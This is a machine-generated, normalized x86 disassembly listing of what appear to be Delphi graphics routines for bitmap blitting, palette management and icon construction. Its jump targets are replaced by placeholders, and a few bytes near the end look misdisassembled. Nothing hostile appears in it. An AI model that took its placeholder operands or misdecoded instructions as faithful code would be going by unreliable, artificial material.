mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_4253a4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_42561b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406b24
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4257cf
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_4257dc
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_425814
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402b5c
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_42588c
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_4258e4
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028d8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4259e1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4259e8
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_4259fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_425a82
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_425a94
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028d8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_42588c
mov eax esp
call sub_4259fc
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_425b38
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_42588c
mov [ esp ] eax
sub_425b8c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_425534
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_425514
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_425d38
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_4253a4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425c5e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_4253b4
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425c65
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_4252a8
sub_425c65
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_425534
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_4253a4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425d18
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_4253b4
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425d1f
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_425d54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_425de4
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407cac
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_4260db
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_425ecd
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_4252a8
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425ed4
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_425ed4
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_425d48
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407cac
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_4260bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_425b8c
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407cac
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_426098
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42609f
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4026fc
retn
call sub_4252fc
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_425d48
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_425d54
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_4260ec
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_425290
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b5c
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_425534
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_4261d0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_4260ec
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_42623c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_4260ec
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4262d9
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4262e0
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_426310
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402b5c
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402b5c
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_426304
xor edx edx
push ebp
push sub_4264fe
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_4261d0
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_4261d0
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_4264d7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407cac
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407cac
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407cac
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407cac
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_42623c
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_42623c
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4264de
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4026fc
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4026fc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4026fc
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4026fc
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_4264de
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426505
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_42650c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403124
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_42655c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_4265b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_42655c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4265fd
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40309c
mov edi eax
mov eax esi
call sub_40309c
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
